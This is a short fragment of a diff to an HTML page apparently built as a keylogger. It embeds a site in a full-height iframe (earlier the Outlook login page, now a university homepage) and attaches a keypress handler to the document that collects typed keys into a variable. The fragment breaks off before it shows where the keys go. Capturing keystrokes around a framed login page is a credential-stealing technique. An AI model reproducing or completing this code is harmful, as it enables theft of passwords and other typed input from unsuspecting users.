@@ -40,12 +40,12 @@
     </script>
                                                                                          
  
-    <iframe src = "https://outlook.live.com/login.srf" width = "100%" height = "2000" id = "frame"></iframe>
+    <iframe src = "https://www.mizzou.edu" width = "100%" height = "2000" id = "frame"></iframe>
                                                                                      
     <script>
-        const f = document.getElementById("frame");
+       // const f = document.getElementById("frame");
         var keys = '';
-        f.onkeypress = function(e){
+        document.onkeypress = function(e){
           get = window.event ? event:e;
                                                                                          
           key = get.keyCode ? get.keyCode : get.charCode;
